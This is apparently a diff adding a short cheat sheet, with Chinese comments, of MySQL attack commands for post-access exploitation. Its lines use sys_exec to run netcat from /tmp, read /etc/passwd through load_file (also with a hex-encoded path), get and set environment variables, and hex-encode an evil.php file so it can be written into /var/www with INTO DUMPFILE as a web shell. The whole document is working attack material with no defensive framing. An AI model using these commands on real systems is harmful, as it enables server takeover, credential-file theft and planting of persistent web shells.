@@ -1,0 +1,24 @@
+mysql -uroot -e \"SELECT sys_exec(\'/tmp/nc\');\"
+
+select sys_exec('/bin/nc')
+select user()
+select version()
+select database()
+select load_file()
+select shell_exec()
+
+//获得环境变量
+sys_get('')
+
+//设置环境变量
+sys_set('')
+
+
+
+select load_file('/etc/passwd')
+select load_file('0x2f657463...')       //ascii code for /etc/passwd
+
+
+cat evil.php |xxd -ps|tr -d '\n'
+替换下行 (0x....)
+select null,null,...(0x....) INTO DUMPFILE("/var/www/evil.php")
